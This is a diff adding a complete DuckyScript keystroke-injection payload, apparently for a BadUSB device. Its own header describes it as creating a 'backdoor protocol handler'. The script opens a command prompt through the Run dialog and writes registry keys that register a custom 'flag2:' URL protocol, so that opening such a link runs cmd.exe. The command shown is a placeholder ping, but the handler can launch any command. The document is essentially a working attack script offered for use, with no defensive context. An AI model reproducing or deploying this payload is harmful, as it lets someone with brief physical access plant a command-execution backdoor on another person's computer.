@@ -1,0 +1,29 @@
+REM Author: ItsSixtyN3in
+REM Description: Creates a new backdoor protocol handler
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING cmd
+ENTER
+DELAY 560
+LEFTARROW
+ENTER
+DELAY 300
+STRING @echo off
+ENTER
+DELAY 300
+STRING set Handler=flag2
+ENTER
+DELAY 300
+STRING reg add HKEY_CURRENT_USER\Software\Classes\%Handler% /d "URL: %Handler%" /v "URL Protocol" /f
+ENTER
+DELAY 300
+STRING reg add HKEY_CURRENT_USER\Software\Classes\%Handler%\shell\open\command /d "C:\Windows\System32\cmd.exe /c ping 1.1.1.1" /f
+ENTER
+DELAY 300
+STRING exit
+ENTER
